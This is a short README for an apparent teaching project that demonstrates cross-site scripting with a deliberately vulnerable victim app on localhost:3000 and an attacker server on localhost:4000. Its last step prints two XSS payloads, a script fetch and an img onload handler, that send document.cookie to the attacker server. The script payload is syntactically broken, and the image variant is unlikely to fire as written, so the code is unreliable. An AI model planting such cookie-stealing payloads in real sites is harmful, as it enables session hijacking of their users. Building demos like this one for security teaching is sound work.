## XSS Demo attack web app

To run this project, follow these steps:

1. Install the dependencies by running the following command:

   ```shell
   npm install
   ```

2. Launch the web application with the following command:

   ```shell
   node server.js
   ```

3. Point your browser to [http://localhost:3000](http://localhost:3000) to access the victim web app.

   Then you can enter javascript and it will be saved and run on the page: `<b>Hello from my bold comment</b>`

4. Launch the attacker with the following command:

   ```shell
   node attacker-server.js
   ```

5. Open in browser [http://localhost:4000](http://localhost:4000/) - the attacker web app

6. Add these to the victim website: 

   - the script way: <script>fetch('http://localhost:4000?data='document.cookie)</script>
   - the image way: <img src="abc" onload="this.src='http://localhost:4000?data='+document.cookie">
